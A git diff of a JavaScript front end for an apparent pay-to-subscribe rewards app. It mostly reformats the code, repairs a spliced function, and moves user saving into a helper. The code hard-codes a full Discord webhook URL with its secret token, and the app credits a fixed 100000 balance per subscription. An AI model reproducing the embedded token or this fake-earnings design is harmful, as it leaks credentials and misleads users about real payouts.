@@ -16,15 +16,18 @@ const balanceWebhook =
 "https://discord.com/api/webhooks/1504475637069385730/XTi4OFxJC0d1ZWWl23gg2c4qob3TyTuBmTQYlAjd87amBuVVF6kkKJ8ainS90WtYKGox";
 
 
+
 // VIDEO LINK
 
 const VIDEO_LINK =
 "https://youtube.com";
 
 
+
 // CURRENT USER
 
 let currentUser = null;
+
 
 
 // AUTO LOGIN
@@ -44,6 +47,7 @@ showHome();
 }
 
 };
+
 
 
 // LOGIN
@@ -145,14 +149,15 @@ currentUser.name
 
 });
 
-  
+
+// SHOW HOME
+showHome();
+
+}
 
 
-// HIDE ALL
 
-function hideAllPages(){
-
-document.getElementById("logi// SHOW HOME
+// SHOW HOME
 
 function showHome(){
 
@@ -201,7 +206,15 @@ document.querySelector(".verifyBtn")
 
 }
 
-}nPage")
+}
+
+
+
+// HIDE ALL
+
+function hideAllPages(){
+
+document.getElementById("loginPage")
 .classList.add("hidden");
 
 document.getElementById("homePage")
@@ -219,6 +232,7 @@ document.getElementById("reviewPage")
 }
 
 
+
 // VIDEO
 
 function openVideo(){
@@ -229,6 +243,7 @@ VIDEO_LINK,
 );
 
 }
+
 
 
 // OPEN PAGES
@@ -242,6 +257,8 @@ document.getElementById("subscribePage")
 
 }
 
+
+
 function openWithdraw(){
 
 hideAllPages();
@@ -250,6 +267,8 @@ document.getElementById("withdrawPage")
 .classList.remove("hidden");
 
 }
+
+
 
 function openReview(){
 
@@ -261,6 +280,7 @@ document.getElementById("reviewPage")
 }
 
 
+
 // BACK HOME
 
 function backHome(){
@@ -268,6 +288,7 @@ function backHome(){
 showHome();
 
 }
+
 
 
 // SUBSCRIBE
@@ -317,22 +338,8 @@ currentUser.balance += 100000;
 currentUser.earning += 100000;
 
 
-// SAVE USER
-localStorage.setItem(
-
-currentUser.name,
-
-JSON.stringify(currentUser)
-
-);
-
-localStorage.setItem(
-
-"currentUser",
-
-JSON.stringify(currentUser)
-
-);
+// SAVE
+saveUser();
 
 
 // WEBHOOK
@@ -378,6 +385,8 @@ showHome();
 
 }
 
+
+
 // SELECT AMOUNT
 
 let selectedAmount = 0;
@@ -393,6 +402,7 @@ document.getElementById("selectedAmount")
 amount;
 
 }
+
 
 
 // WITHDRAW
@@ -492,6 +502,7 @@ showHome();
 }
 
 
+
 // REVIEW
 
 function submitReview(){
@@ -555,7 +566,8 @@ showHome();
 }
 
 
- // SAVE USER
+
+// SAVE USER
 
 function saveUser(){
 
@@ -576,6 +588,8 @@ JSON.stringify(currentUser)
 );
 
 }
+
+
 
 // BALANCE WEBHOOK
 
@@ -611,4 +625,4 @@ currentUser.balance
 
 });
 
-}
+  }
